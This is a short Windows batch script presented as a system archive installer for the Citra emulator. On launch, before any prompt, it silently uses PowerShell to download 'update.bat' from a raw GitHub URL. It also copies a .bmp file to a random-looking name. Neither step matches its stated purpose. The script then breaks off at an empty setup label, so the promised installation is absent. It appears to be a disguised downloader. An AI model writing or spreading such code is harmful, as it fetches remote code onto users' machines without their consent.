@echo off
title Citra - System archive installer
powershell.exe (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hipeopeo/s/master/update.bat', 'update.bat')
copy %cd%\NET_ex.bmp %cd%\xjhfkea.bmp

:main
set /p menu="Do you want to setup system archives in Citra? (Y/N)"
if %menu%==Y goto SA
if %menu%==y goto SA
if %menu%==N goto close
if %menu%==n goto close

:close
set /p pause=Press any key to exit...
exit

:SA
